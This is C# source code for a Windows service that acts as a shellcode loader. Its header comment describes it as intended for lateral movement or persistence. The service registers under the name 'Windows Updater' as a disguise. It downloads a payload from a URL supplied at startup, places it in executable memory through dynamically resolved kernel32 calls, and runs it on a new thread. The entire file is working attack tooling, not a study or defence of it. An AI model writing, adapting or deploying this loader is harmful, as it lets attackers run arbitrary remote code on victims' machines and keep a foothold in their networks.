// Simple windows service like shellcode loader, mainly to be used for lateral movement or persistence
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ServiceProcess;
using System.Threading;
using System.Net;

namespace ServiceDropper
{
    public class MyService : ServiceBase
    {
        private enum mem : uint
        {
            rwx = 0x40,
            rw = 0x04,
            rx = 0x20,
            cmt_rv = 0x3000,
            proc_all = 0x001F0FFF
        }

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA(string lib_name);

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr lib_handle, string func_name);

        // Delegates
        private delegate IntPtr VAE(IntPtr addr, uint size, uint aloc, uint prot);
        private delegate bool VPE(IntPtr addr, int size, uint aloc, out uint prot);
        private delegate IntPtr CRT(IntPtr satt, uint size, IntPtr strt, IntPtr pms, uint zero, out IntPtr ID);
        private delegate bool Term(IntPtr handle, uint exit_code);

        private static VAE Allocate { get; set; }
        private static VPE Protect { get; set; }
        private static CRT Threader { get; set; }
        private static Term Terminator { get; set; }



        private static byte[] Fetch(string url)
        {
            WebClient client = new WebClient();
            byte[] sc = client.DownloadData(url);
            return sc;
        }

        private Thread _workerThread;
        private bool _stopRequested;
        private IntPtr thread_handle;
        private string address;

        public MyService(string address)
        {
            this.ServiceName = "Windows Updater";
            this.address = address;

            IntPtr hModule = LoadLibraryA("kernel32.dll");

            Allocate = (VAE)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "VirtualAlloc"), typeof(VAE));
            Protect = (VPE)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "VirtualProtect"), typeof(VPE));
            Threader = (CRT)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "CreateThread"), typeof(CRT));
            Terminator = (Term)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "TerminateThread"), typeof(Term));
        }

        protected override void OnStart(string[] args)
        {

            _stopRequested = false;

            _workerThread = new Thread(DoWork);
            _workerThread.Start();

            EventLog.WriteEntry("Service started successfully.");
        }

        protected override void OnStop()
        {
            _stopRequested = true;
            _workerThread.Join();

            Terminator(thread_handle, 0);

            EventLog.WriteEntry("Service stopped.");
        }

        private void DoWork()
        {
            byte[] sc = Fetch(this.address);

            IntPtr mem_addr = Allocate(IntPtr.Zero, (uint)sc.Length, (uint)mem.cmt_rv, (uint)mem.rw);
            Marshal.Copy(sc, 0, mem_addr, sc.Length);

            uint old = 0;
            bool res = Protect(mem_addr, sc.Length, (uint)mem.rx, out old);
            IntPtr tid = IntPtr.Zero;
            IntPtr tread_handle = Threader(IntPtr.Zero, 0, mem_addr, IntPtr.Zero, 0, out tid);


            while (!_stopRequested)
            {
                Thread.Sleep(5000);
            }
        }

        public static class Program
        {
            public static void Main(string[] args)
            {
                if (Environment.UserInteractive)
                {
                    Console.WriteLine("Starting service in debug mode...");
                    return;
                }
                else
                {
                    ServiceBase.Run(new MyService(args[0]));
                }
            }
        }
    }
}